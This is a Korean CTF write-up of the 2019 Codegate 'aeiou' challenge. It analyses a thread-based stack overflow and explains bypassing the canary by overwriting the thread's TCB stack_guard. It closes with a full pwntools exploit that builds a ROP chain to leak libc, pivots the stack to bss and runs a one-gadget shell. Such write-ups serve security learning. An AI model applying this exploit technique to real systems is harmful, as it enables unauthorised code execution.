---
title: "2019 Codegate aeiou"
date: 2020-1-9
tags: [Codegate]
categories: [Codegate]
---

64bit 바이너리가 주어진다.

```
aeiou: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=1c2c4b1f2f26f776c18181389463bc18024091b4, stripped
```

보호기법은 Full RELRO, Canary, NX가 걸려있다.

```
[*] '/vagrant/ctfs/aeiou'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`pthread_create` 함수로 스레드 생성해서 `start_routine` 함수를 실행해주는 부분이다.

```c
int sub_401507()
{
  int result; // eax
  pthread_t newthread; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  pthread_create(&newthread, 0LL, start_routine, 0LL);
  result = pthread_join(newthread, 0LL);
  if ( result )
  {
    puts("oooooh :(");
    result = 1;
  }
  return result;
}
```

pthread_create Code : [Link](https://code.woboq.org/userspace/glibc/nptl/pthread_create.c.html)

pthread_create Description : [Link](https://www.joinc.co.kr/w/man/3/pthread_create)

`sub_400FF5` 함수를 보면 입력한 수를 atoi로 정수로 변환해서 v2에 저장한다. v2 버퍼 크기는 0x1000인데 0x1000이상을 입력할 수 있다. 또 그 크기만큼 `sub_401170` 함수에서 입력을 받는다. 근데 문제는 카나리가 걸려있다는 점이다. 

```c
void *__fastcall start_routine(void *a1)
{
  unsigned __int64 v2; // [rsp+8h] [rbp-1018h]
  char s; // [rsp+10h] [rbp-1010h]
  unsigned __int64 v4; // [rsp+1018h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(&s, 0, 0x1000uLL);
  puts("Hello!");
  puts("Let me know the number!");
  v2 = sub_400FF5();
  if ( v2 <= 65536 )
  {
    sub_401170(0, &s, v2);
    puts("Thank You :)");
  }
  else
  {
    puts("Too much :(");
  }
  return 0LL;
}
```

`pthread_create` 함수에 쓰레드가 생성되면 이 쓰레드가 사용할 스택을 만들어주는데 이 쓰레드의 스택에 `stack_guard` 가 존재한다. 

```c
typedef struct
{
void *tcb; /* Pointer to the TCB. Not necessary the
thread descriptor used by libpthread. */
dtv_t *dtv;
void *self; /* Pointer to the thread descriptor. */
int multiple_threads;
uintptr_t sysinfo;
uintptr_t stack_guard;
uintptr_t pointer_guard;
} tcbhead_t;
```

TCB 구조체를 보면 `stack_guard` 영역은 `fs:0x28` Canary 영역의 값이다. `stack_guard` 와 Canary랑 비교하는데 Canary를 A로 쭉 덮고 stack_guard도 A로 쭉 덮으면 SSP를 우회할 수 있다.

TCB Overwrite : [Link](https://bases-hacking.org/tcb-overwrite.html)

익스는 간단하다. Canary를 A로 쭉 덮어주고 gadget들 이용해서 libc구해준다. stack pivoting으로 oneshot 날려주면 된다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
e = ELF('./aeiou')
p = process('./aeiou')
libc = e.libc
prdi = 0x00000000004026f3 # pop rdi ; ret
prsi_r15 = 0x00000000004026f1 # pop rsi ; pop r15 ; ret
prbp = 0x0000000000400c70 # pop rbp ; ret
sla = lambda x,y : p.sendlineafter(x,y)
sl = lambda x : p.sendline(x)
s = lambda x : p.send(x)
bss = 0x00000000006040CA
leave_ret = 0x0000000000400d70 # leave ; ret

payload = 'A'*0x1008
payload += 'AAAAAAAA' # Canary
payload += 'AAAAAAAA'
payload += p64(prdi) + p64(e.got['system']) + p64(e.plt['puts'])
payload += p64(prdi) + p64(0) + p64(prsi_r15) + p64(bss) + p64(0) + p64(e.plt['read'])
payload += p64(prbp) + p64(bss-8)
payload += p64(leave_ret) 
payload = payload.ljust(0x2000,'A') # Canary dup

'''
payload = 'A'*0x1008
payload += 'realsung' # Canary
payload += 'AAAAAAAA'
payload += p64(prdi) + p64(e.got['puts']) + p64(e.plt['puts'])
payload += p64(prdi) + p64(0) + p64(prsi_r15) + p64(bss) + p64(0) + p64(e.plt['read'])
payload += p64(prbp) + p64(bss-8)
payload += p64(leave_ret) 
payload = payload.ljust(0x17e8,'A')
payload += 'realsung' # Canary
'''

sla('>>','3')
sl(str(len(payload)))
s(payload)

libc_base = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - libc.symbols['system']
log.info('libc_base : ' + hex(libc_base))

sl(p64(libc_base + 0x4526a))

p.interactive()
```

